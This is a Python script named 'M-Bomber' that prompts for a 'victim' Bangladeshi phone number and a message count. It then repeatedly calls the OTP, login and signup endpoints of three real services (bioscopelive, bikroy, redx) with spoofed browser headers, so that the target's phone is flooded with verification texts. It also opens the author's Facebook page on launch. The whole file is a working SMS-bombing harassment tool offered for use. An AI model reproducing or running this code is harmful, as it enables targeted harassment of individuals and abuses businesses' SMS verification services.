import requests,os
os.system("clear")
𝐌𝐞𝐡𝐞𝐝𝐢_𝐨𝐟𝐟𝐞𝐜𝐢𝐚𝐥="""
   \033[1;33m✧☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
   ☆ \033[1;34mᴡᴇʟᴄᴏᴍᴇ to my tools & ᴇɴᴊᴏʏ ᴛʜɪꜱ ᴛᴏᴏʟ \033[1;33m☆ 
   ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
\033[1;35m╔═══════════════════════════════════════════════════════╗
║   \033[1;32m__  ___      ____                  __              \033[1;35m ║
║   \033[1;32m/  |/  /     / __ )____  ____ ___  / /_  ___  _____\033[1;35m ║
║   \033[1;32m/ /|_/ /_____/ __  / __ \/ __ `__ \/ __ \/ _ \/ ___/\033[1;35m║
║  \033[1;32m/ /  / /_____/ /_/ / /_/ / / / / / / /_/ /  __/ /    \033[1;35m║
║  \033[1;32m/ /  /_/     /_____/\____/_/ /_/ /_/_.___/\___/_/ \033[1;35m   ║
\033[1;31m╠═══════════════════════════════════════════════════════\033[1;35m║
\033[1;35m║                    \033[1;36m ☞𝐌𝐞𝐡𝐞𝐝𝐢_𝐨𝐟𝐟𝐞𝐜𝐢𝐚𝐥☜ \033[1;35m                ║\033[1;35m
\033[1;35m╠═══════════════════════════════════════════════════════╣
\033[1;35m║\033[1;33m  Name     :   𝐌𝐞𝐡𝐞𝐝𝐢                                  \033[1;35m║
\033[1;35m║ \033[1;33m ADMIN    :   𝐌𝐞𝐡𝐞𝐝𝐢_𝐨𝐟𝐟𝐞𝐜𝐢𝐚𝐥                         \033[1;35m║
\033[1;35m║ \033[1;32m TOOLS    :   M-Bomber                                \033[1;35m║
\033[1;35m║ \033[1;34m GITHUB   :   Mehedi-offecial                         \033[1;35m║
\033[1;35m╚═══════════════════════════════════════════════════════╝
╔═══════════════════════════════════════════════════════╗
║    \033[1;37m  THANKS TO STLP TEAM  \033[1;37m    \033[1;35m  ║\033[1;35m
╚═══════════════════════════════════════════════════════╝
"""
print(𝐌𝐞𝐡𝐞𝐝𝐢_𝐨𝐟𝐟𝐞𝐜𝐢𝐚𝐥)
os.system("xdg-open https://www.facebook.com/%E0%A6%85%E0%A6%9C%E0%A6%BE%E0%A6%A8%E0%A6%BE%E0%A6%95%E0%A7%87-%E0%A6%9C%E0%A6%BE%E0%A6%A8%E0%A6%BE%E0%A6%B0-%E0%A6%87%E0%A6%9A%E0%A7%8D%E0%A6%9B%E0%A6%BE-325706962165660/?mibextid=ZbWKwL")
nmbr=input("\033[1;31mENTER VICTIM NUMBER : +880")
total=int(input("\033[1;33m ENTER SMS AMMOUNT  : "))
print("""\033[1;32m\n\nWAIT FEW SECOND AND SEE
↘""")
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+nmbr+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+nmbr
data={
  "name": nmbr,
  "phoneNumber": nmbr,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
count=0
while total>count:
  send1=requests.get(url1,headers=headers1)
  if send1.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
  else:
    pass
  send2=requests.get(url2,headers=headers2)
  if send2.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
  else:
    pass
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
    
  else:
    pass
print("""\033[1;35m
………………………………………………………………………………………………
  \033[1;36m  ʕ•ᴥ•ʔ ALL SMS SENT DONE ʕ•ᴥ•ʔ\033[1;35m  
………………………………………………………………………………………………
""")